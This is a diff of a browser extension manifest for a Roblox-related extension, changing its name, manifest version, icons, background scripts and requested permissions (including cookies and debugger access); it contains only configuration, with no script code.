@@ -1,29 +1,23 @@
 {
-    "name": "Roblox Extension",
-    "description": "Extension for https://www.roblox.com",
-    "version": "1.0.0",
-    "manifest_version": 3,
-
-    "action" : {
-        "default_icon": "assets/roblox.png"
+    "name": "RobloxWeb+",
+    "version": "1.01", 
+    "manifest_version": 2,
+    "description": "This extension is work in progress and may have bugs.", 
+    "browser_action": {
+        "default_icon": "icon.png"
+       
     },
-
-    "host_permissions": [
-	"https://*/*"
-    ],
-
     "permissions": [
-        "cookies"
+        "alarms",
+        "debugger",
+        "notifications",
+        "cookies",
+        "https://www.roblox.com/" 
     ],
-
     "background": {
-        "service_worker": "scripts/roblox.js"
+        "scripts": ["bgWork.js", "jQuery-ver3.js"]
     },
-
-    "icons": {
-        "16": "assets/roblox.png",
-        "32": "assets/roblox.png",
-        "48": "assets/roblox.png",
-        "128": "assets/roblox.png"
-    }
+    "icons": { "16": "icon.png",
+           "48": "icon.png",
+          "128": "icon.png" }
 }
